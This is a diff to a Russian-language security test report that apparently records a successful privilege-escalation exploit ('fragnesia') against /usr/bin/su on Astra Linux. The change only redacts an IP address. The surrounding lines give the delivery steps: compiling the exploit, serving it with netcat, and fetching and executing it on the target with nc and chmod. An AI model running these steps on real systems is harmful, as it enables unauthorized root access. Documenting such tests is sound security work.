@@ -7,7 +7,7 @@
 - ОС: Astra Linux 1.7_x86-64
 - Пользователь: ksb / astra (uid=1000)
 - Целевой бинарник: /usr/bin/su
-- IP-адрес: IP_REMOVED
+- IP-адрес: ***
 
 ## Результат теста
 СТАТУС: УСПЕШНО
@@ -31,14 +31,14 @@ cd pocs/fragnesia
 gcc -o exp fragnesia.c
 
 ### Шаг 2. Запуск netcat-сервера
-В отдельном терминале на той же машине (IP IP_REMOVED):
+В отдельном терминале на той же машине (IP ***):
 
 nc -l -p 1234 < exp
 
 ### Шаг 3. Получение и запуск на целевой системе
 На уязвимой машине (пользователь astra или ksb):
 
-nc IP_REMOVED 1234 > fragnesia
+nc *** 1234 > fragnesia
 chmod +x fragnesia
 ./fragnesia
 
